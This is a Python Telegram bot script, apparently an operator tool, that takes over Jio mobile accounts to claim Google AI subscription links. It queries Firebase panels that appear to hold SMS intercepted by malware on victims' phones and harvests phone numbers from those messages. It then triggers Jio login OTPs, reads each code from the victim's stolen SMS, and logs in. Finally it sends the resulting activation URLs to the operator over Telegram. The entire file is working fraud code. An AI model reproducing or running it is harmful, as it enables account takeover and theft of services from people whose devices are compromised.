"""
Jio Gemini Activation Scanner - TELEGRAM BOT & RENDER EDITION (FULL CODE)
Flow: Telegram Command (/run, /addpanel, /listpanels) → Read panels.txt → Online Devices → Unique Numbers → Process Links & Send to Telegram
"""

from __future__ import annotations
import csv
import html
import re
import time
import base64
import os
import threading
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo, ZoneInfoNotFoundError
from flask import Flask
import telebot
import requests

# ==================== TELEGRAM & WEB SERVER CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN must be set in Environment Variables.")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

@app.route('/')
def alive():
    return "Bot is running online on Render!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

ADMIN_CHAT_ID = 1847021130

# ==================== TIMEZONE SAFE CONFIG ====================
def configured_timezone() -> ZoneInfo:
    timezone_name = os.getenv("APP_TIMEZONE", "Asia/Kathmandu")
    try:
        return ZoneInfo(timezone_name)
    except ZoneInfoNotFoundError:
        try:
            import tzdata
            return ZoneInfo(timezone_name)
        except Exception:
            return ZoneInfo("UTC")

TIMEZONE = configured_timezone()

# ==================== LOAD PANELS FROM PANELS.TXT ====================
def load_panels_from_file():
    panels = []
    if os.path.exists("panels.txt"):
        with open("panels.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split(",", 1)
                    if len(parts) == 2:
                        panels.append((parts[0].strip(), parts[1].strip()))
    return panels

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 15
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

# ==================== FUNCTIONS ====================

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    if key and key.startswith("http"):
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=20)
        response.raise_for_status()
        return response.json()
    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return session

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

# ==================== TELEGRAM COMMAND HANDLERS ====================

@bot.message_handler(commands=['run'])
def handle_run_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
    
    bot.reply_to(message, "🚀 စစ်ဆေးမှု စတင်နေပါပြီ ခဏစောင့်ပါ...")
    threading.Thread(target=main_process, args=(message.chat.id,), daemon=True).start()

@bot.message_handler(commands=['addpanel'])
def add_panel_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ပို့ပေးပါ:\n`/addpanel URL,KEY`", parse_mode="Markdown")
        return
    
    panel_info = parts[1].strip()
    if "," not in panel_info:
        bot.reply_to(message, "⚠️ URL နှင့် Key ကြားတွင် ကော်မာ (`,`) ခံရန် မမေ့ပါနှင့်။")
        return
    
    with open("panels.txt", "a", encoding="utf-8") as f:
        f.write(panel_info + "\n")
        
    bot.reply_to(message, "✅ Panel အသစ်ကို `panels.txt` ထဲသို့ အောင်မြင်စွာ ထည့်သွင်းပြီးပါပြီ!")

@bot.message_handler(commands=['listpanels'])
def list_panels_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
        
    panels = load_panels_from_file()
    if not panels:
        bot.reply_to(message, "📁 `panels.txt` ထဲတွင် Panel တစ်ခုမှ မရှိသေးပါ။")
        return
        
    text = f"📋 <b>လက်ရှိ Panel စုစုပေါင်း ({len(panels)} ခု):</b>\n\n"
    for idx, (url, key) in enumerate(panels[:15], start=1):
        text += f"{idx}. <code>{url}</code>\n"
        
    if len(panels) > 15:
        text += f"\n... နှင့် အခြား {len(panels) - 15} ခု ကျန်ရှိသေးသည်။"
        
    bot.reply_to(message, text, parse_mode="HTML")

# ==================== MAIN PROCESS ====================

def main_process(chat_id: int) -> int:
    FIREBASE_PANELS = load_panels_from_file()
    if not FIREBASE_PANELS:
        bot.send_message(chat_id, "❌ `panels.txt` ဖိုင်ထဲတွင် Panel လင့်ခ်များ မတွေ့ပါ။ ကျေးဇူးပြု၍ `/addpanel` ဖြင့် သို့မဟုတ် `panels.txt` ထဲတွင် ထည့်ပေးပါ။")
        return 1

    bot.send_message(chat_id, f"🔍 STEP 1: `panels.txt` မှ Panel စုစုပေါင်း {len(FIREBASE_PANELS)} ခုကို စစ်ဆေးနေပါပြီ...")
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    
    for panel_idx, (base_url, firebase_key) in enumerate(FIREBASE_PANELS, start=1):
        firebase = firebase_session()
        try:
            if firebase_key and firebase_key.startswith("http"):
                response = firebase.get(f"{base_url}/clients.json", timeout=10)
            else:
                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=10)
            
            if response.status_code == 200:
                clients = response.json()
                if isinstance(clients, dict):
                    for device_id, data in clients.items():
                        if isinstance(data, dict) and data.get("status") is True:
                            all_online_devices[device_id] = {
                                "base_url": base_url,
                                "firebase_key": firebase_key,
                                "firebase_session": firebase,
                                "data": data,
                            }
        except Exception:
            pass
    
    if not all_online_devices:
        bot.send_message(chat_id, "❌ Online ရှိသော Device တစ်ခုမှ မတွေ့ပါ။")
        return 1
    
    mappings: dict[str, set[str]] = defaultdict(set)
    for device_id, info in all_online_devices.items():
        try:
            messages = latest_messages(
                info["firebase_session"],
                info["base_url"],
                info["firebase_key"],
                device_id,
                MESSAGE_SCAN_LIMIT,
            )
            device_messages[device_id] = messages
            for mobile in number_candidates(messages):
                mappings[mobile].add(device_id)
        except Exception:
            device_messages[device_id] = {}
    
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))
    
    if not targets:
        bot.send_message(chat_id, "❌ ဖုန်းနံပါတ် Candidate တစ်ခုမှ မတွေ့ပါ။")
        return 1
    
    bot.send_message(chat_id, f"🎯 တွေ့ရှိသော Unique Numbers စုစုပေါင်း: {len(targets)} ခု။ OTP + Activation စတင်နေပါပြီ...")
    
    statuses: Counter[str] = Counter()
    for serial, (device_id, mobile) in enumerate(targets, start=1):
        info = all_online_devices.get(device_id)
        if not info:
            continue
        base_url = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase = info["firebase_session"]
        device = info["data"]
        
        if not isinstance(device, dict) or device.get("status") is not True:
            status, url = "device_offline", ""
        else:
            jio = jio_session()
            if not is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                known_keys = set(device_messages.get(device_id, {}))
                if not send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = get_activation(jio)
                    
        statuses[status] += 1
        
        if url:
            success_msg = f"✅ <b>Activation အောင်မြင်ပါသည်!</b>\n📱 ဖုန်းနံပါတ်: <code>{mobile}</code>\n🔗 လင့်ခ်: {url}"
            bot.send_message(chat_id, success_msg, parse_mode="HTML", disable_web_page_preview=True)
            
    summary_text = f"📊 <b>စစ်ဆေးမှု ပြီးဆုံးပါပြီ (FINAL SUMMARY)</b>\n\n"
    summary_text += f"📱 Online Devices : {len(all_online_devices)}\n"
    summary_text += f"🎯 Unique Numbers : {len(targets)}\n\n"
    for status, count in sorted(statuses.items()):
        summary_text += f"▪️ {status}: {count} ခု\n"
        
    bot.send_message(chat_id, summary_text, parse_mode="HTML")
    return 0

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    print("Starting Web Server and Bot...")
    t_web = threading.Thread(target=run_web, daemon=True)
    t_web.start()
    bot.infinity_polling(skip_pending=True)
                      
